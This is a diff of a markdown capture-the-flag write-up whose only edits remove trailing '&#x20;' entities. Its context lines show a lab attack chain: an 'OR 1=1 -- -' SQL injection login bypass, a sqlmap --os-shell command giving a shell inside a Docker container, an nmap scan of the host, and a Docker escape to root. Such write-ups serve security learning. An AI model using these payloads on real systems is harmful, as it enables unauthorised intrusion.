@@ -74,7 +74,7 @@ So this is vulnerable to SQL Injection, and we can use `'OR 1=1 -- -` to bypass 
 
 <figure><img src="../../../.gitbook/assets/image (2339).png" alt=""><figcaption></figcaption></figure>
 
-There wasn't much within the administrator panel for us to use, so let's go back to the SQL Injection and see if we can get a webshell via `sqlmap`.&#x20;
+There wasn't much within the administrator panel for us to use, so let's go back to the SQL Injection and see if we can get a webshell via `sqlmap`.
 
 ```bash
 $ sqlmap -r req --force-ssl --os-shell
@@ -84,7 +84,7 @@ do you want to retrieve the command standard output? [Y/n/a] y
 command standard output: 'uid=102(postgres) gid=104(postgres) groups=104(postgres),102(ssl-cert)'
 ```
 
-This works, and we can get a webshell. The weird part is, this is a Windows machine and I ran `id` out of instinct. This means that the website and database are probably run within a Docker container. Anyways, we can get a reverse shell via a `bash` one-liner.&#x20;
+This works, and we can get a webshell. The weird part is, this is a Windows machine and I ran `id` out of instinct. This means that the website and database are probably run within a Docker container. Anyways, we can get a reverse shell via a `bash` one-liner.
 
 <figure><img src="../../../.gitbook/assets/image (2694).png" alt=""><figcaption></figcaption></figure>
 
@@ -98,7 +98,7 @@ I found the user flag within the `/var/lib/postgresql` folder:
 
 ### Docker Escape
 
-Earlier, we found that the administrator needs to send credentials to `tony` or something. Earlier, we found a `docker-toolbox.exe` file, and it is probably used to create this Docker.&#x20;
+Earlier, we found that the administrator needs to send credentials to `tony` or something. Earlier, we found a `docker-toolbox.exe` file, and it is probably used to create this Docker.
 
 We can first figure out where other containers are located at via IP Address:
 
@@ -121,7 +121,7 @@ lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
         TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0
 ```
 
-I downloaded the `nmap` binary onto this machine via `curl`, and found that SSH was open on 172.17.0.1.&#x20;
+I downloaded the `nmap` binary onto this machine via `curl`, and found that SSH was open on 172.17.0.1.
 
 ```
 postgres@bc56e3cc55e9:/tmp$ ./nmap 172.17.0.1
@@ -169,7 +169,7 @@ drwxr-xr-x    2 root     root          1420 May  7 04:34 bin
 drwxr-xr-x    3 root     root            60 May  7 04:37 c
 ```
 
-This is likely the Windows machine file system being mounted, and since we are `root`, we can go ahead and enumerate it.&#x20;
+This is likely the Windows machine file system being mounted, and since we are `root`, we can go ahead and enumerate it.
 
 ```
 root@box:/c/Users/Administrator# ls -la                                        
